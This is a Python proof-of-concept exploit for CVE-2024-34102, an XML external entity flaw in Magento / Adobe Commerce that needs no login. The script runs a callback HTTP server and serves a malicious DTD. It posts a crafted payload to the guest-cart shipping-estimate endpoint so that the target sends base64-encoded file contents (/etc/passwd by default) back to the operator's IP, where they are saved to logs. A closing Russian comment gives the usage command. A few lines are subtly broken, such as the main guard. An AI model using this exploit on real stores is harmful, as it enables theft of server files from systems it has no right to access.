import requests
import argparse
import re
import os
import http.server
import socketserver
import threading
import time
import base64
from urllib.parse import urlparse

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ANSI color codes
light_gray_color = '\033[37;1m'
dimmed_gray_color = '\033[90m'
honey_yellow_color = '\033[38;5;214m'
dim_yellow_color = "\033[33;1m"
cyan_color = '\033[96m'
green_color = '\033[92m'
red_color = '\033[31m'
reset_color = '\033[0m'

LOG_DIR = "logs"
last_get_request_time = 0


def banner():
    print(f"""
{light_gray_color}
░█▀▀█ ░█──░█ ░█▀▀▀ ── █▀█ █▀▀█ █▀█ ─█▀█─ ── █▀▀█ ─█▀█─ ▄█─ █▀▀█ █▀█
░█─── ─░█░█─ ░█▀▀▀ ▀▀ ─▄▀ █▄▀█ ─▄▀ █▄▄█▄ ▀▀ ──▀▄ █▄▄█▄ ─█─ █▄▀█ ─▄▀
░█▄▄█ ──▀▄▀─ ░█▄▄▄ ── █▄▄ █▄▄█ █▄▄ ───█─ ── █▄▄█ ───█─ ▄█▄ █▄▄█ █▄▄

-> {dim_yellow_color}
POC for CVE-2024-34102. A pre-authentication XML entity injection issue in Magento / Adobe Commerce.{reset_color}
-> By: x.com / mohamednab1l
-> {dim_yellow_color}
Use this wisely.
{reset_color}

""")


def print_message(level, message):
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
    if level == 'info':
        print(f"{current_time} {green_color}[INFO]{reset_color} {message}")
    elif level == 'warning':
        print(f"{current_time} {honey_yellow_color}[VLUN]{reset_color}{dim_yellow_color} {message} {reset_color}")
    elif level == 'error':
        print(f"{current_time} {red_color}[ERROR]{reset_color} {message}")


def create_log_dir():
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)
        print_message('info', f"Log directory created: {LOG_DIR}")


def clean_host(url):
    parsed_url = urlparse(url)
    host = parsed_url.netloc or parsed_url.path
    host = re.sub(r'^www\.', '', host)
    host = re.sub(r'/$', '', host)
    return host


def setup_webserv(ip, port, path):
    if not os.path.exists('webserv'):
        os.makedirs('webserv')
        print_message('info', "webserv directory created.")

    poc_path = 'webserv/poc.xml'
    if os.path.exists(poc_path):
        os.remove(poc_path)
        print_message('info', "Existing poc.xml file removed.")

    with open(poc_path, 'w') as file:
        file.write(f"""<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource={path}">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://{ip}:{port}/poc.xml?%data;'>">""")
        print_message('info', "New poc.xml file created.")


def start_http_server(port):
    handler = CustomHTTPRequestHandler
    os.chdir('webserv')
    try:
        httpd = socketserver.TCPServer(("", port), handler)
    except OSError as e:
        if e.errno == 98:
            print_message('error', f"Port {port} is already in use. Please use a different port.")
            cleanup_and_exit()
        else:
            raise
    print_message('info', f"Serving HTTP on port {port}")

    def serve_forever(httpd):
        with httpd:
            httpd.serve_forever()

    server_thread = threading.Thread(target=serve_forever, args=(httpd,))
    server_thread.daemon = True
    server_thread.start()
    return httpd


class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global last_get_request_time
        last_get_request_time = time.time()

        if "poc.xml" in self.path:
            if "?" in self.path:
                print_message('warning', "Target is vulnerable! Received callback!")
                try:
                    encoded_data = self.path.split("poc.xml?")[1].split(" ")[0]
                    # Remove any HTTP version or extra parameters
                    encoded_data = encoded_data.split(' ')[0].split('&')[0]
                    decoded_data = base64.b64decode(encoded_data).decode('utf-8')
                    print_message('warning', f"Received file contents:\n{reset_color}{decoded_data}")# Save to log file
                    log_filename = f"{LOG_DIR}/result_{int(time.time())}.txt"
                    with open(log_filename, 'w') as f:
                        f.write(decoded_data)
                    print_message('info', f"Results saved to: {log_filename}")

                except Exception as e:
                    print_message('error', f"Error decoding data: {e}")
                    print_message('info', f"Raw data received: {self.path}")

            # Serve the XML file
            return super().do_GET()

        super().do_GET()

def send_poc_request(url, host, ip, port):
    full_url = f"{url}/rest/all/V1/guest-carts/test-assetnote/estimate-shipping-methods"
    headers = {
        "Host": host,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/json"
    }

    data = {
        "address": {
            "totalsReader": {
                "collectorList": {
                    "totalCollector": {
                        "sourceData": {
                            "data": f"""<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://{ip}:{port}/poc.xml">
%sp;
%param1;
]>
<r>&exfil;</r>""",
                            "options": 16
                        }
                    }
                }
            }
        }
    }

    try:
        print_message('info', f"Sending exploit request to: {full_url}")
        response = requests.post(full_url, headers=headers, json=data, timeout=10, verify=False)
        print_message('info', f"Response status code: {dim_yellow_color}{response.status_code}{reset_color}")

        if response.status_code == 200:
            print_message('info', "Request successful, waiting for callback...")
        else:
            print_message('warning', f"Unexpected status code: {response.status_code}")

    except requests.exceptions.TooManyRedirects:
        print_message('error', "Exceeded 30 redirects")
    except requests.exceptions.Timeout:
        print_message('error', "The request timed out")
    except requests.exceptions.SSLError:
        print_message('error', "SSL error occurred")
    except requests.exceptions.RequestException as e:
        print_message('error', f"An error occurred: {e}")

def cleanup_and_exit():
    print_message('info', "Cleaning up...")
    if os.path.exists('webserv'):
        for root, dirs, files in os.walk('webserv', topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir('webserv')
        print_message('info', "webserv directory and its contents removed.")
    print_message('info', "Script ended!")
    os._exit(0)

def check_get_request_timeout():
    global last_get_request_time
    start_time = time.time()
    while True:
        if time.time() - last_get_request_time > 15 and last_get_request_time > 0:
            print_message('info', "No callback received within timeout period")
            cleanup_and_exit()
        if time.time() - start_time > 30:  # Overall timeout 30 seconds
            print_message('info', "Overall timeout reached")
            cleanup_and_exit()
        time.sleep(1)

def main():
    banner()
    create_log_dir()  # Move this here

    parser = argparse.ArgumentParser(description='POC for CVE-2024-34102')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-ip', '--ip', required=True, help='Your IP address')
    parser.add_argument('-p', '--port', required=True, help='Port for HTTP server')
    parser.add_argument('-r', '--path', default='/etc/passwd', help='The path to the file to be included in the poc')

    args = parser.parse_args()url = args.url.rstrip('/')
    ip = args.ip
    port = int(args.port)
    path = args.path

    global last_get_request_time
    last_get_request_time = time.time()

    host = clean_host(url)
    print_message('info', f"Target: {url}")
    print_message('info', f"Host: {host}")
    print_message('info', f"Server IP: {ip}:{port}")
    print_message('info', f"Target file: {path}")

    setup_webserv(ip, port, path)
    httpd = start_http_server(port)
    
    # Wait a moment for server to start
    time.sleep(2)
    
    timeout_thread = threading.Thread(target=check_get_request_timeout)
    timeout_thread.daemon = True
    timeout_thread.start()

    send_poc_request(url, host, ip, port)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print_message('info', "Keyboard interrupt received. Exiting...")
        cleanup_and_exit()

if name == "main":  # Fixed this line
    main()

    #скрипт юзать с комнадой: python3 script.py -u https://target.com -ip YOUR_IP -p 8080 -r /etc/passwd